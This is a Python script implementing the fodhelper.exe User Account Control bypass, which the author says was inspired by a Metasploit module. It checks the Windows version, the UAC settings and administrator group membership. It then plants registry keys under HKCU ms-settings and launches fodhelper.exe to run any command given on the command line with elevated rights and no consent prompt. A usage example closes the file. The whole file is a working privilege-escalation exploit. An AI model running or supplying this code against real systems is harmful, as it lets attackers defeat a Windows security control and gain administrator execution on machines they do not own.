"""The UAC bypass by exploiting a vulnerability in fodhelper.exe.

Author: NOURI Redouane (isnpired by bypassuac_fodhelper.rb exploit module in metasploit).
Description: this python script is the implementation of the UAC (User Account Control) bypass by exploiting a vulnerability in the fodhelper.exe (a legitimate Windows binary responsible for handling Features on Demand) by inserting some registery keys in the current user hive.

"""
import subprocess
import ctypes
import os
import sys

#Operating System name info index in the systeminfo command return value
OSNAME_INDEX= 2
#The value of the UAC default level
UAC_DEFAULT_LEVEL= "0x5"
#UAC enabled value
UAC_ENABLED= "0x1"
#UAC disabled value
UAC_DISABLED= "0x0"
#Security IDentifiers
#Administrators group
ADMINISTRATORS_SID = 'S-1-5-32-544'
#Mandatory level
LOW_INTEGRITY_LEVEL_SID = 'S-1-16-4096'
#List of the supported version by this exploitation
supported_windows_versions = ["7", "8", "2008", "2012", "10"]

def is_os_compatible():
    """Compatiblity checker.

    Checks whether the Operating system is in the supported list of this vulnerability exploitation.
    returns True if compatible and False if not.

    """
    print("Supported windows versions: (7|8|2008|2012|10)")
    print("Getting operating system info...")
    sysinfo_splited = subprocess.run('systeminfo',capture_output=True).stdout.split(b"\r\n")
    os_name = sysinfo_splited[OSNAME_INDEX].decode()

    if "Microsoft Windows" in os_name:
        for supported_version in supported_windows_versions:
            if supported_version in os_name :
                print("This Windows version is supported [ ", supported_version," ]")
                return True
            
    return False

def is_uac_status_verified():
    """UAC status verifier.
    Checks whether the UAC is enabled and its level is set to default.

    returns True if yes and False if not.

    """
    print("Checking for UAC status...")
    #The registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System in the Windows Registry contains various system-wide settings and policies related to the behavior of the Windows operating system. 
    system_settings = subprocess.run("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", capture_output=True).stdout.decode().split("\r\n")
    #UAC status
    enable_lua_value = None
    #UAC level
    uac_level = None

    for setting in system_settings:
        if "EnableLUA" in setting:
            enable_lua_value= setting.split("    ")[-1].strip()
        elif "ConsentPromptBehaviorAdmin" in setting:
            uac_level= setting.split("    ")[-1].strip()

    if enable_lua_value is not None:
        if enable_lua_value== UAC_ENABLED:
            print("UAC is enabled.")
            print("Checking for UAC level...")
            if uac_level is not None:
                if uac_level== UAC_DEFAULT_LEVEL:
                    print("UAC is set to default.")
                    return True
                else:
                    print("UAC is not set to default.")
            else:
                print("Error, Unable to determine the UAC level.")
        elif enable_lua_value== UAC_DISABLED:
            print("UAC is already disabled so there is no need to continue.")
        else:
            print("Unable to determine UAC status.")
    else:
        print("Error, unable to determine UAC status because EnableLUA registry value not found.")

    return False

def is_sids_verified():
    """SIDs verifier.

    Verifies whether the current user is in the administrators group and the mandatory level (integrity level) is not low.

    return True if yes and False if not.

    """
    print("Checking if the user is in the administrators group...")
    whoami_result = subprocess.run("whoami /groups", capture_output=True).stdout.decode()

    if ADMINISTRATORS_SID in whoami_result:
        print("User in the administrators group.")
        print("Checking for enough intergrity level...")

        if LOW_INTEGRITY_LEVEL_SID not in whoami_result:
            print("User have enough integrity level.")
            return True
        else:   
            print("Error, user have low integrity level.")
    else:
        print("Error, user not in the administrators group.")
    
    return False

def exploit(command_to_execute):
    """vulnerabilty exploitation.

    if all the conditions for this vulnerability are verified then this function called to exploit the vulnerability by passing the command that needs to bypass UAC to get executed.

    """
    windir = os.getenv('windir')
    run_fodhelper = windir+"\\System32\\fodhelper.exe"
    
    subprocess.run("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d "'+command_to_execute+'" /f', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    os.system(run_fodhelper)

    return True

def is_admin_privilege():
    """Privilege checker.

    returns true if the current user have admin privilege so no need to execute this script because there is no need to bypass UAC, and returns false if the user have no admin privilege so we can execute this exploit script.

    """
    try:
        if os.getuid()== 0:
            return True
    except Exception:
        if ctypes.windll.shell32.IsUserAnAdmin()!= 0:
            return True
    
    return False
  
if __name__ == "__main__":   
    #sys.argv[0]: path to the current file.
    #sys.argv[1]: the first parameter passed by the user, in our case the command he needs to bypass UAC.
    if len(sys.argv)> 1:
        if not is_admin_privilege():
            if is_os_compatible():
                if is_uac_status_verified():
                    if is_sids_verified():
                        exploit(sys.argv[1])
            else:
                print("Error windows version is not supported.")
        else:
            print("This script is running as administrator!")
    else:
        file_name= os.path.basename(__file__)
        print(f"usage: python {file_name} \"command_to_execute\"")
        print(f"example: python {file_name} \"calc.exe\"")